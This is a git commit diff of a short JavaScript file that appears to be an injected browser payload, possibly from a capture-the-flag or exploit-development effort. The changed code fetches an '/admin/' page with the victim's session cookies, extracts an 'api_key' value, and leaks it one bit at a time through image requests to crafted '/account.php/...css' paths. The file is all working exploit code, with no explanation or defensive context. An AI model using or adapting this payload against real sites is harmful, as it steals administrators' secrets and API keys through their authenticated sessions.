475a621d1ec65f82d82719c3a71c74012d9b94fb
Casperchk <60020947+Casperchk@users.noreply.github.com>
2026-09-01 18:04:56 +0100

    u2

--- p1.js
+++ p1.js
@@ -1,16 +1,16 @@
 (function () {
   function b(n) { new Image().src = '/account.php/' + n + '.css'; }
-  b('S1_alive');
+  b('S2_alive');
   fetch('/admin/', { credentials: 'include' })
-    .then(function (r) { b('S1_status_' + r.status); return r.text(); })
+    .then(function (r) { return r.text(); })
     .then(function (t) {
-      b('S1_len_' + t.length);
-      b('S1_haskey_' + (/api_key/i.test(t) ? 1 : 0));
-      b('S1_hasform_' + (/<form/i.test(t) ? 1 : 0));
       var m = t.match(/api_key=([A-Za-z0-9_\-]+)/i);
-      b('S1_keylen_' + (m ? m[1].length : 0));
-      var f = t.match(/action="([^"]*)"/gi) || [];
-      b('S1_forms_' + f.length);
-    })
-    .catch(function () { b('S1_fetcherr'); });
+      if (!m) { b('S2_nokey'); return; }
+      var k = m[1];
+      for (var i = 0; i < k.length; i++) {
+        var c = k.charCodeAt(i);
+        for (var j = 0; j < 8; j++) if (c & (1 << j)) b('S2_' + i + '_' + j);
+      }
+      b('S2_done');
+    });
 })();
